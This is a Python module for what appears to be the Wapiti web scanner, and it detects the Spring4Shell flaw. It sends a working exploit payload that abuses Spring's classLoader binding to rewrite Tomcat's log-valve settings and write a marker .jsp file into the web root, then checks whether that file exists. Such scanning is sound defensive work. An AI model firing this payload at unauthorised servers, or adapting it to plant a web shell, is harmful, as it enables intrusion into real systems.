import uuid
import asyncio

from httpx import RequestError
from wapitiCore.attack.attack import Attack
from wapitiCore.definitions.spring import NAME, WSTG_CODE
from wapitiCore.language.vulnerability import _
from wapitiCore.main.log import log_red, logging
from wapitiCore.net.web import Request


class ModuleSpring4Shell(Attack):
    """
    Detect the Spring4Shell vulnerability
    """

    name = "spring4shell"
    do_get = True
    do_post = True


    async def must_attack(self, request: Request):
        if self.finished is True:
            return False
        return True


    async def _attack_spring4shell_url(self, request_url: str):
        payload_unique_id = uuid.uuid4()
        payload = self._generate_payload(payload_unique_id)

        malicious_request = Request(
            path=request_url,
            method="POST",
            post_params=payload,
        )

        try:
            logging.info(malicious_request)
            await self.crawler.async_send(malicious_request, follow_redirects=True)
        except RequestError:
            self.network_errors += 1
            return
        await self._verify_spring4shell_vulnerability(malicious_request, payload_unique_id)


    async def attack(self, request: Request):

        await self._attack_spring4shell_url(request.url)


    async def _verify_spring4shell_vulnerability(self, request: Request, param_uuid: uuid.UUID):
        if not await self._verify_spring4shell_file(str(param_uuid)):
            return

        await self.add_vuln_critical(
            category=NAME,
            request=request,
            info=_("URL {0} seems vulnerable to Spring4Shell attack") \
                .format(request.url),
            parameter="",
            wstg=WSTG_CODE
        )

        log_red("---")
        log_red(
            _("URL {0} seems vulnerable to Spring4Shell attack"),
            request.url
        )
        log_red(request.http_repr())
        log_red("---")


    async def _verify_spring4shell_file(self, param_uuid: str) -> bool:
        root_url = await self.persister.get_root_url()
        spring4shell_file_url = root_url + "spring4shell-wapiti3.jsp"

        spring4shell_file_request = Request(
            path=spring4shell_file_url,
            method="GET",
        )

        # need to wait here and make a first request
        await asyncio.sleep(10)
        await self.crawler.async_send(spring4shell_file_request, follow_redirects=False)

        logging.info(spring4shell_file_request)

        # need to wait again and then we can check if file was created
        await asyncio.sleep(10)
        response = await self.crawler.async_send(spring4shell_file_request, follow_redirects=False)


        if response.is_success and param_uuid in response.content:
            self.finished = True
            return True

        return False

    @staticmethod
    def _generate_payload(unique_id: uuid.UUID) -> str:
        log_pattern = ["class.module.classLoader.resources.context.parent.pipeline.first.pattern",
        f"spring4shell-wapiti3-{unique_id}"]
        log_file_suffix = ["class.module.classLoader.resources.context.parent.pipeline.first.suffix",".jsp"]
        log_file_dir = ["class.module.classLoader.resources.context.parent.pipeline.first.directory","webapps/ROOT"]
        log_file_prefix = ["class.module.classLoader.resources.context.parent.pipeline.first.prefix",
        "spring4shell-wapiti3"]
        log_file_date_format = ["class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",""]

        return [log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format]
